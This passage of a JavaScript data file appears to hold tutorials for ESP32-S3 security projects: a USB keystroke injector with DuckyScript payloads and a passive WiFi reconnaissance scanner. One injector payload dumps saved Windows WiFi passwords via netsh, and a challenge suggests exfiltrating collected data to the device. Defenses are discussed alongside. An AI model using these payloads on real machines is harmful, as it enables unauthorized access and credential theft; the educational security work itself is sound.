Keyboard.press(KEY_ESC);\n        Keyboard.releaseAll();\n    }\n    delay(50);  // Brief pause between commands\n}',
                language: 'C++',
                tip: '<strong>DuckyScript</strong> is the scripting language used by the USB Rubber Ducky. It is simple and widely documented. By making your engine compatible, you can use thousands of existing payloads from the security community (after reviewing them for safety).'
            },
            {
                title: 'Create Safe Demonstration Payloads',
                content: '<p>Store payload files on SPIFFS. These three payloads are safe, educational, and reversible:</p>',
                code: '// payload1.txt — System Info (Windows)\n// Saves to: sysinfo.txt on Desktop\nREM System Information Collector\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c systeminfo > %USERPROFILE%\\Desktop\\sysinfo.txt\nENTER\nDELAY 2000\nREM File created on Desktop\n\n// payload2.txt — Create Evidence File\nREM Creates a text file proving USB access\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING USB Security Assessment\nENTER\nSTRING This file was created by an authorized USB device.\nENTER\nSTRING Timestamp: \nENTER\nSTRING If you see this file, USB HID devices are not blocked.\nENTER\n\n// payload3.txt — WiFi Passwords (Windows)\nREM Extract saved WiFi passwords\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c netsh wlan show profiles | findstr "All User" > %USERPROFILE%\\Desktop\\wifi_audit.txt & for /f "tokens=4 delims=:" %a in (\'netsh wlan show profiles ^| findstr "All User"\') do @(netsh wlan show profile name=%a key=clear | findstr "Key Content" >> %USERPROFILE%\\Desktop\\wifi_audit.txt)\nENTER',
                language: 'DuckyScript',
                tip: '<strong>Payload 3 extracts saved WiFi passwords on Windows.</strong> This is a common penetration testing technique &mdash; saved WiFi credentials are stored in plaintext by Windows and accessible to any user. The defense is to use WPA2-Enterprise with certificate-based auth instead of PSK.'
            },
            {
                title: 'Build the Display Menu',
                content: '<p>The TFT shows a list of available payloads. BOOT button scrolls, USER button executes. The display updates with execution status in real time.</p>',
                code: 'struct Payload {\n    const char* name;\n    const char* description;\n    const char* filename;\n};\n\nPayload payloads[] = {\n    {"SysInfo Dump", "Collect system info", "/payload1.txt"},\n    {"Evidence File", "Create proof of access", "/payload2.txt"},\n    {"WiFi Audit", "Extract saved WiFi keys", "/payload3.txt"}\n};\nconst int NUM_PAYLOADS = 3;\nint selected = 0;\n\nvoid drawPayloadMenu() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(0xF800, TFT_BLACK);  // Red\n    tft.setTextSize(2);\n    tft.setCursor(10, 5);\n    tft.println("USB INJECTOR");\n    \n    tft.setTextSize(1);\n    for (int i = 0; i < NUM_PAYLOADS; i++) {\n        tft.setCursor(10, 40 + i * 25);\n        if (i == selected) {\n            tft.setTextColor(TFT_BLACK, TFT_CYAN);\n        } else {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        }\n        tft.print(" ");\n        tft.print(payloads[i].name);\n        tft.print(" ");\n        \n        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);\n        tft.setCursor(10, 40 + i * 25 + 12);\n        tft.println(payloads[i].description);\n    }\n    \n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.setCursor(10, 130);\n    tft.println("BOOT=scroll  USER=execute");\n}\n\nvoid executePayload(int idx) {\n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.setCursor(10, 145);\n    tft.println("INJECTING...");\n    \n    File f = SPIFFS.open(payloads[idx].filename, "r");\n    if (!f) {\n        tft.println("ERROR: File not found");\n        return;\n    }\n    \n    int lineNum = 0;\n    while (f.available()) {\n        String line = f.readStringUntil(\'\\n\');\n        processLine(line);\n        lineNum++;\n        \n        // Update progress on display\n        tft.fillRect(10, 145, 300, 10, TFT_BLACK);\n        tft.setCursor(10, 145);\n        tft.printf("Line %d processed", lineNum);\n    }\n    f.close();\n    \n    tft.fillRect(10, 145, 300, 10, TFT_BLACK);\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(10, 145);\n    tft.println("COMPLETE");\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'Add Execution Delay and Safety Confirmation',
                content: '<p>Add a configurable delay before execution begins (default: 3 seconds). This gives the operator time to cancel if the wrong system is targeted. The display shows a countdown.</p>',
                code: 'void executeWithCountdown(int idx, int delaySec) {\n    for (int i = delaySec; i > 0; i--) {\n        tft.fillRect(10, 145, 300, 15, TFT_BLACK);\n        tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n        tft.setCursor(10, 145);\n        tft.printf("Executing in %d... (BOOT=cancel)", i);\n        \n        // Check for cancel\n        for (int ms = 0; ms < 1000; ms += 50) {\n            if (digitalRead(BTN_BOOT) == LOW) {\n                tft.fillRect(10, 145, 300, 15, TFT_BLACK);\n                tft.setTextColor(0x07E0, TFT_BLACK);\n                tft.setCursor(10, 145);\n                tft.println("CANCELLED");\n                delay(1000);\n                drawPayloadMenu();\n                return;\n            }\n            delay(50);\n        }\n    }\n    executePayload(idx);\n}',
                language: 'C++',
                tip: '<strong>The cancel window is critical.</strong> Professional tools always have an abort mechanism. In a real assessment, the operator needs to verify they are plugged into the correct target before the payload fires. Without a cancel, a misplaced device could execute on the wrong machine.'
            },
            {
                title: 'Detection and Defense Discussion',
                content: '<p>Every technique you build should be paired with its defense. USB keystroke injection can be detected and prevented:</p>' +
                         '<ul>' +
                         '<li><strong>USB Device Policies (GPO):</strong> Windows Group Policy can restrict which USB devices are allowed. Whitelist only approved keyboard VIDs/PIDs.</li>' +
                         '<li><strong>Keystroke Timing Analysis:</strong> Humans type 40-80 WPM with variable delays. USB injectors type at 1000+ WPM with uniform timing. EDR agents can detect this pattern.</li>' +
                         '<li><strong>USB Port Lockdown:</strong> Physical port locks or epoxy in unused USB ports. Simple but effective.</li>' +
                         '<li><strong>New Device Alerts:</strong> Configure the OS to alert when a new HID device is connected. On Linux: udev rules. On Windows: Group Policy or third-party tools.</li>' +
                         '<li><strong>USB Firewall:</strong> Tools like USBGuard (Linux) or commercial USB security products that prompt before allowing new devices.</li>' +
                         '</ul>',
                code: null,
                language: null,
                tip: '<strong>The lesson:</strong> USB HID trust is a design flaw in the USB specification itself. Every OS trusts HID devices by default because the spec was designed in an era when all USB devices were trusted peripherals. Modern security requires treating USB ports as untrusted network interfaces.'
            }
        ],

        testing: '<p>Verify the complete workflow:</p>' +
                 '<ul>' +
                 '<li><strong>SPIFFS:</strong> Upload the payload files to SPIFFS using PlatformIO filesystem upload. Verify they appear in the file list on the display.</li>' +
                 '<li><strong>Menu navigation:</strong> BOOT button cycles through payloads, display highlights the selected item.</li>' +
                 '<li><strong>Countdown:</strong> After pressing USER, the 3-second countdown appears with cancel option.</li>' +
                 '<li><strong>Payload 1 (SysInfo):</strong> A sysinfo.txt file appears on the target Desktop.</li>' +
                 '<li><strong>Payload 2 (Evidence):</strong> Notepad opens with the assessment text.</li>' +
                 '<li><strong>Payload 3 (WiFi):</strong> A wifi_audit.txt file appears with saved network names and keys.</li>' +
                 '<li><strong>Cancel:</strong> Pressing BOOT during countdown stops execution.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>SPIFFS upload fails:</strong> Use PlatformIO: Upload Filesystem Image (not regular Upload). Create a <code>data/</code> folder in your project root and put payload .txt files there.</li>' +
                         '<li><strong>Payload types wrong characters:</strong> USB HID uses US keyboard layout. If the target uses a different layout, characters like @, #, \\, / may map incorrectly. Test on the same layout as the target.</li>' +
                         '<li><strong>GUI+R does not open Run dialog:</strong> The target may have Windows key disabled via Group Policy, or the user may not have Run dialog enabled. This is actually a defense working correctly.</li>' +
                         '<li><strong>WiFi payload returns empty:</strong> The target may use 802.1X enterprise WiFi which does not store PSK passwords locally. Or the user account may not have admin privileges to read key content.</li>' +
                         '<li><strong>Commands execute too fast:</strong> Increase DELAY values in payloads. Some applications (Notepad, cmd) take longer to open on slower machines.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Multi-OS Payload</strong> &mdash; Create a payload that detects the target OS (Windows vs macOS vs Linux) by trying key combinations and observing timing, then branches to the correct command sequence for that OS.</p>' +
                    '<p><strong>Challenge 2: Exfiltration via WiFi</strong> &mdash; Instead of saving files to the Desktop, have the payload POST collected data to a web server running on the ESP32-S3 itself (using its WiFi AP mode). The data never touches the target filesystem.</p>' +
                    '<p><strong>Challenge 3: Build USBGuard Rules</strong> &mdash; On a Linux machine, install USBGuard and write rules that would block this device. Then test whether your rules actually prevent the payload from executing. Document the detection vs evasion game.</p>',

        stepVisuals: {},

        componentCallouts: {
            svg: '',
            components: [
                {
                    id: 't-display-s3',
                    name: 'LILYGO T-Display-S3 (from SG-93)',
                    purpose: 'Same board as SG-93. The native USB OTG presents as a USB HID keyboard to the target computer. The TFT display shows payload selection and execution status. SPIFFS flash stores payload scripts.',
                    specs: ['USB HID Class 0x03', 'SPIFFS: ~4MB usable', 'DuckyScript compatible', 'Button-triggered execution']
                }
            ]
        },

        commonMistakes: [
            {
                title: 'Executing Payloads Without Reading Them First',
                correct: 'Read every line of a payload before executing it. Understand what each command does. Run on a VM first. Only then run on real hardware.',
                incorrect: 'Downloading a payload from the internet and running it without review. DuckyScript payloads can contain destructive commands (format, delete, exfiltrate).',
                consequence: 'The payload runs commands you did not expect. Files get deleted, settings get changed, or data gets sent to an unknown server. You cannot undo keystrokes once typed.'
            },
            {
                title: 'No Execution Delay or Cancel Mechanism',
                correct: 'Always include a countdown with cancel option before payload execution. 3-5 seconds minimum. The operator must have time to verify they are on the right target.',
                incorrect: 'Payload begins typing immediately on boot or button press with no way to abort.',
                consequence: 'If the board is plugged into the wrong machine (instructor laptop, production server, another student machine), the payload executes before anyone can stop it.'
            },
            {
                title: 'Leaving the Board Plugged In After Testing',
                correct: 'Unplug the board immediately after testing. Store it in a labeled container. Never leave it connected to any machine unattended.',
                incorrect: 'Leaving the board plugged into a USB port after testing. It continues to present as a keyboard and could be accidentally triggered.',
                consequence: 'Someone bumps the button, or a reboot triggers the boot sequence, and the payload fires again on an unmonitored machine.'
            }
        ]
    }

},

    // ========================================================================
    // SG-95: WiFi Recon Scanner with Display UI
    // ========================================================================
    'sg-95': {
        intro: '<p>Turn the T-Display-S3 into a portable WiFi reconnaissance tool. The built-in WiFi radio scans all 2.4GHz channels, and the TFT display shows a real-time list of discovered networks with signal strength, channel, and encryption type &mdash; color-coded for quick assessment.</p>' +
               '<p>Unlike SG-06 (which used the ESP32 CYD), this version runs on the S3 with its smaller 170x320 display, requiring a tighter UI layout. You will build a scrollable list view, a detail view for individual networks, and a channel utilization histogram.</p>' +
               '<p>This is a passive reconnaissance tool &mdash; it only listens, it does not transmit or connect. Passive scanning is legal in all jurisdictions.</p>',

        wiring: '    No external wiring required.\n    T-Display-S3 only.\n    WiFi uses the onboard PCB antenna.',

        wiringNotes: '<p><strong>No external wiring.</strong> The ESP32-S3 WiFi antenna is integrated on the T-Display-S3 PCB.</p>' +
                     '<p><strong>Legal note:</strong> Passive WiFi scanning (receive-only) is legal. You are only reading publicly broadcast beacon frames that every WiFi access point transmits 10 times per second. This is the same data your phone sees when you look at available networks.</p>' +
                     '<p><strong>Safety:</strong> This tool shows network names, signal strength, and encryption types. It does not capture traffic, passwords, or data. It is equivalent to running <code>iwlist scan</code> on Linux or viewing available networks on your phone.</p>',

        wiringSvg: '',

        steps: [
            {
                title: 'WiFi Scanner Core',
                content: '<p>The ESP32-S3 WiFi library provides <code>WiFi.scanNetworks()</code> which performs a full channel sweep and returns all visible access points. We scan in station mode without connecting to anything.</p>',
                code: '#include <TFT_eSPI.h>\n#include <WiFi.h>\n\nTFT_eSPI tft = TFT_eSPI();\n\nstruct Network {\n    String ssid;\n    int32_t rssi;\n    uint8_t channel;\n    uint8_t encType;\n    uint8_t bssid[6];\n    bool hidden;\n};\n\nNetwork networks[64];\nint networkCount = 0;\n\nvoid scanNetworks() {\n    WiFi.mode(WIFI_STA);\n    WiFi.disconnect();\n    delay(100);\n    \n    int found = WiFi.scanNetworks(false, true);  // sync, show hidden\n    networkCount = min(found, 64);\n    \n    for (int i = 0; i < networkCount; i++) {\n        networks[i].ssid = WiFi.SSID(i);\n        networks[i].rssi = WiFi.RSSI(i);\n        networks[i].channel = WiFi.channel(i);\n        networks[i].encType = WiFi.encryptionType(i);\n        networks[i].hidden = (WiFi.SSID(i).length() == 0);\n        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);\n    }\n    \n    // Sort by signal strength (strongest first)\n    for (int i = 0; i < networkCount - 1; i++) {\n        for (int j = i + 1; j < networkCount; j++) {\n            if (networks[j].rssi > networks[i].rssi) {\n                Network temp = networks[i];\n                networks[i] = networks[j];\n                networks[j] = temp;\n            }\n        }\n    }\n    WiFi.scanDelete();\n}',
                language: 'C++',
                tip: '<strong>WiFi.scanNetworks(false, true)</strong> &mdash; first param is async (false = block until done), second is show_hidden (true = include hidden SSIDs). Hidden networks broadcast beacon frames with an empty SSID field but are still discoverable by their BSSID.'
            },
            {
                title: 'Display List View',
                content: '<p>Render the network list on the 170x320 TFT with color-coded signal strength bars and encryption indicators. The small screen fits about 8 networks at a time with scrolling.</p>',
                code: 'int scrollOffset = 0;\nconst int VISIBLE_ROWS = 8;\nconst int ROW_HEIGHT = 18;\n\nuint16_t rssiColor(int32_t rssi) {\n    if (rssi > -50) return 0x07E0;  // Green: excellent\n    if (rssi > -65) return 0x07FF;  // Cyan: good\n    if (rssi > -75) return 0xFFE0;  // Yellow: fair\n    if (rssi > -85) return 0xFDA0;  // Orange: weak\n    return 0xF800;                   // Red: very weak\n}\n\nconst char* encLabel(uint8_t enc) {\n    switch (enc) {\n        case WIFI_AUTH_OPEN: return "OPEN";\n        case WIFI_AUTH_WEP: return "WEP";\n        case WIFI_AUTH_WPA_PSK: return "WPA";\n        case WIFI_AUTH_WPA2_PSK: return "WPA2";\n        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";\n        case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";\n        case WIFI_AUTH_WPA3_PSK: return "WPA3";\n        default: return "???";\n    }\n}\n\nvoid drawNetworkList() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Header\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(1);\n    tft.setCursor(5, 2);\n    tft.printf("WIFI RECON  %d networks  CH scan", networkCount);\n    tft.drawLine(0, 12, 320, 12, 0x2104);  // Dim separator\n    \n    // Network rows\n    for (int i = 0; i < VISIBLE_ROWS && (i + scrollOffset) < networkCount; i++) {\n        int idx = i + scrollOffset;\n        Network &n = networks[idx];\n        int y = 16 + i * ROW_HEIGHT;\n        \n        // Signal bar\n        int barWidth = map(constrain(n.rssi, -100, -30), -100, -30, 2, 30);\n        tft.fillRect(2, y + 2, barWidth, 12, rssiColor(n.rssi));\n        \n        // SSID\n        tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        tft.setCursor(36, y + 3);\n        String displaySSID = n.hidden ? "(hidden)" : n.ssid;\n        if (displaySSID.length() > 18) displaySSID = displaySSID.substring(0, 18) + "..";\n        tft.print(displaySSID);\n        \n        // Channel + Encryption\n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(230, y + 3);\n        tft.printf("CH%2d %s", n.channel, encLabel(n.encType));\n        \n        // RSSI value\n        tft.setTextColor(rssiColor(n.rssi), TFT_BLACK);\n        tft.setCursor(290, y + 3);\n        tft.printf("%d", n.rssi);\n    }\n    \n    // Scroll indicator\n    if (networkCount > VISIBLE_ROWS) {\n        int barH = max(10, (VISIBLE_ROWS * 144) / networkCount);\n        int barY = 16 + (scrollOffset * 144) / networkCount;\n        tft.fillRect(317, barY, 3, barH, 0x4208);\n    }\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'Channel Histogram View',
                content: '<p>Switch to a channel utilization view showing how many networks are on each channel. This helps identify congestion and find the quietest channel &mdash; useful for both offense (finding targets) and defense (optimizing your own network).</p>',
                code: 'void drawChannelHistogram() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Count networks per channel\n    int channelCount[14] = {0};\n    for (int i = 0; i < networkCount; i++) {\n        if (networks[i].channel >= 1 && networks[i].channel <= 13) {\n            channelCount[networks[i].channel]++;\n        }\n    }\n    \n    // Find max for scaling\n    int maxCount = 1;\n    for (int ch = 1; ch <= 13; ch++) {\n        if (channelCount[ch] > maxCount) maxCount = channelCount[ch];\n    }\n    \n    // Header\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setCursor(5, 2);\n    tft.printf("CHANNEL MAP  %d networks", networkCount);\n    \n    // Draw bars\n    int barWidth = 20;\n    int maxBarHeight = 100;\n    for (int ch = 1; ch <= 13; ch++) {\n        int x = 10 + (ch - 1) * 23;\n        int barH = (channelCount[ch] * maxBarHeight) / maxCount;\n        int y = 130 - barH;\n        \n        // Color: non-overlapping channels (1,6,11) in green, others yellow\n        uint16_t color = (ch == 1 || ch == 6 || ch == 11) ? 0x07E0 : 0xFFE0;\n        \n        if (barH > 0) {\n            tft.fillRect(x, y, barWidth, barH, color);\n        }\n        \n        // Channel label\n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(x + 4, 135);\n        tft.printf("%d", ch);\n        \n        // Count label\n        if (channelCount[ch] > 0) {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n            tft.setCursor(x + 4, y - 10);\n            tft.printf("%d", channelCount[ch]);\n        }\n    }\n    \n    // Legend\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(5, 150);\n    tft.print("Green=non-overlapping (1,6,11)");\n    tft.setTextColor(0xFFE0, TFT_BLACK);\n    tft.setCursor(5, 162);\n    tft.print("Yellow=overlapping channels");\n}',
                language: 'C++',
                tip: '<strong>Channels 1, 6, and 11</strong> are the only non-overlapping 2.4GHz channels. In a well-designed network, all APs use only these three. If you see networks on channels 2-5 or 7-10, they are causing co-channel interference with their neighbors.'
            },
            {
                title: 'Auto-Scan Loop with View Toggle',
                content: '<p>Combine everything: auto-scan every 10 seconds, toggle between list view and channel histogram with the BOOT button, scroll the list with the USER button.</p>',
                code: 'enum View { VIEW_LIST, VIEW_CHANNELS };\nView currentView = VIEW_LIST;\nunsigned long lastScan = 0;\nconst unsigned long SCAN_INTERVAL = 10000;\n\nvoid setup() {\n    Serial.begin(115200);\n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    pinMode(0, INPUT_PULLUP);   // BOOT\n    pinMode(14, INPUT_PULLUP);  // USER\n    \n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setCursor(20, 60);\n    tft.setTextSize(2);\n    tft.println("WIFI RECON");\n    tft.setTextSize(1);\n    tft.setCursor(20, 90);\n    tft.println("Scanning...");\n    \n    scanNetworks();\n    drawNetworkList();\n}\n\nvoid loop() {\n    // Auto-scan\n    if (millis() - lastScan > SCAN_INTERVAL) {\n        scanNetworks();\n        if (currentView == VIEW_LIST) drawNetworkList();\n        else drawChannelHistogram();\n        lastScan = millis();\n    }\n    \n    // BOOT: toggle view\n    if (digitalRead(0) == LOW) {\n        currentView = (currentView == VIEW_LIST) ? VIEW_CHANNELS : VIEW_LIST;\n        if (currentView == VIEW_LIST) drawNetworkList();\n        else drawChannelHistogram();\n        delay(300);\n    }\n    \n    // USER: scroll (list view only)\n    if (digitalRead(14) == LOW && currentView == VIEW_LIST) {\n        scrollOffset += VISIBLE_ROWS;\n        if (scrollOffset >= networkCount) scrollOffset = 0;\n        drawNetworkList();\n        delay(300);\n    }\n}',
                language: 'C++',
                tip: '<strong>10-second scan interval</strong> is a good balance between freshness and radio activity. Faster scanning is possible but generates more RF traffic and drains battery faster if running on LiPo.'
            }
        ],

        testing: '<p>Verify:</p>' +
                 '<ul>' +
                 '<li><strong>Network detection:</strong> The list should show your own WiFi network and neighbors. Compare count with your phone WiFi list.</li>' +
                 '<li><strong>Signal color coding:</strong> Nearby APs should be green/cyan, distant ones yellow/red.</li>' +
                 '<li><strong>Hidden networks:</strong> Any hidden networks appear as "(hidden)" with their channel and BSSID still visible.</li>' +
                 '<li><strong>Channel histogram:</strong> Most networks should cluster on channels 1, 6, and 11.</li>' +
                 '<li><strong>Scrolling:</strong> USER button scrolls through the list if more than 8 networks found.</li>' +
                 '<li><strong>View toggle:</strong> BOOT button switches between list and histogram.</li>' +
                 '<li><strong>Auto-refresh:</strong> Networks update every 10 seconds without button press.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Zero networks found:</strong> Make sure <code>WiFi.mode(WIFI_STA)</code> is called before scanning. The radio must be in station mode to perform scans.</li>' +
                         '<li><strong>Only finding a few networks:</strong> The PCB antenna on the T-Display-S3 has limited range compared to external antennas. Move closer to known APs to verify detection.</li>' +
                         '<li><strong>Display flickers during scan:</strong> <code>WiFi.scanNetworks()</code> blocks for 2-5 seconds. Consider using async scanning (<code>WiFi.scanNetworks(true)</code>) to keep the display responsive.</li>' +
                         '<li><strong>Channel 14 networks not shown:</strong> Channel 14 is only legal in Japan. The ESP32 may not scan it by default depending on region settings.</li>' +
                         '<li><strong>Crash or watchdog reset:</strong> If you have too many networks (dense urban area), reduce the array size or add bounds checking on the sort loop.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Vendor OUI Lookup</strong> &mdash; Use the first 3 bytes of each BSSID to identify the access point manufacturer (Cisco, Ubiquiti, TP-Link, etc.). Store an OUI lookup table in SPIFFS and display the vendor name next to each network.</p>' +
                    '<p><strong>Challenge 2: Signal Strength Over Time</strong> &mdash; Track RSSI for a selected network across multiple scans. Draw a line graph showing signal strength over the last 60 seconds. This is useful for finding the physical location of an AP by walking toward stronger signal.</p>' +
                    '<p><strong>Challenge 3: Rogue AP Detection</strong> &mdash; Compare the current scan against a baseline (saved to SPIFFS). Alert when a new SSID appears that was not in the baseline &mdash; this could be a rogue AP or evil twin. Display new networks in red.</p>',

        stepVisuals: {},

        componentCallouts: {
            svg: '',
            components: [
                {
                    id: 't-display-s3',
                    name: 'LILYGO T-Display-S3 (from SG-93)',
                    purpose: 'The ESP32-S3 WiFi radio scans 2.4GHz channels for beacon frames. The TFT display shows network list and channel histogram. No external antenna needed for indoor scanning.',
                    specs: ['WiFi 802.11 b/g/n', '2.4GHz only (no 5GHz)', 'PCB antenna', 'Passive scanning only']
                }
            ]
        },

        commonMistakes: [
            {
                title: 'Forgetting WiFi.scanDelete() After Processing',
                correct: 'Call <code>WiFi.scanDelete()</code> after copying scan results to your own array. This frees the memory allocated by the scan.',
                incorrect: 'Repeatedly calling <code>WiFi.scanNetworks()</code> without deleting previous results.',
                consequence: 'Memory leak. After 10-20 scans, the ESP32-S3 runs out of heap memory and crashes with a watchdog reset. The device reboots mid-operation.'
            },
            {
                title: 'Scanning in AP Mode',
                correct: 'Set <code>WiFi.mode(WIFI_STA)</code> before scanning. Station mode allows the radio to scan all channels.',
                incorrect: 'Trying to scan while the ESP32-S3 is in AP mode (hosting its own network). Or not setting any mode.',
                consequence: 'Scan returns 0 networks or fails silently. The radio cannot scan while it is busy serving clients on a single channel.'
            },
            {
                title: 'Confusing Passive Scanning with Active Attacks',
                correct: 'Passive WiFi scanning only receives broadcast beacon frames. It is the same as your phone showing available networks. It is legal and non-intrusive.',
                incorrect: 'Assuming that a WiFi scanner is the same as a WiFi attack tool. Scanning does not send deauth frames, does not intercept traffic, and does not connect to networks.',
                consequence: 'Misunderstanding the legal and ethical boundaries. Passive scanning is reconnaissance. Active attacks (deauth, injection, spoofing) are separate techniques with different legal implications.'
            }
        ]
    }

};
